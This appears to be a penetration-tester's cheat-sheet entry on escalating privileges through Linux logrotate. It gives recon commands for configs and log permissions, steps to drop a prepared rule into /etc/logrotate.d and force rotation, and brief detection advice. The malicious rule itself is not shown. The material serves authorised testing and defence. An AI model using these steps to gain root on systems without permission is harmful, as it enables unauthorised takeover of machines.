---
technique: logrotate Abuse
category: privilege-escalation
targets: Linux logrotate
protocols: Local
remote_capable: false
tags: linux privilege-escalation logrotate cron file-write
---

# logrotate Abuse

logrotate abuse targets writable rotation configs, writable rotated logs, and privileged post-rotate hooks.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Writable config or log path | Operator must control a logrotate input or rule |
| Privileged rotation | logrotate must run as root or another target user |
| Trigger | Rotation must occur by schedule or manual execution |

## Linux

### Read main config

#sh #logrotate #recon

Read the main logrotate configuration.

```sh title:"Read logrotate config"
cat /etc/logrotate.conf
```
<!-- cheat -->

### List drop-ins

#sh #logrotate #recon

List logrotate drop-in rules.

```sh title:"List logrotate drop-ins"
ls -la /etc/logrotate.d
```
<!-- cheat -->

### Check log permissions

#sh #logrotate #filesystem

Check permissions on a log file rotated by a privileged rule.

```sh title:"Check rotated log permissions"
ls -la "$log_file"
```
<!-- cheat
var log_file
-->

### Check log directory permissions

#sh #logrotate #filesystem

Check permissions on the directory that contains a rotated log.

```sh title:"Check log directory permissions"
ls -lad "$log_dir"
```
<!-- cheat
var log_dir
-->

### Step 1: Copy logrotate drop-in

#sh #logrotate #file-write

Copy a prepared logrotate rule into the drop-in directory.

```sh title:"Copy logrotate drop-in"
cp "$config_file" "/etc/logrotate.d/$rule_name"
```
<!-- cheat
var config_file
var rule_name
-->

### Step 2: Force logrotate rule

#sh #logrotate

Force logrotate to process the prepared rule.

```sh title:"Force logrotate rule"
logrotate -f "/etc/logrotate.d/$rule_name"
```
<!-- cheat
var rule_name
-->

## Detection

Monitor `/etc/logrotate.d` writes, forced rotations, postrotate command execution, and rotated logs in writable directories.
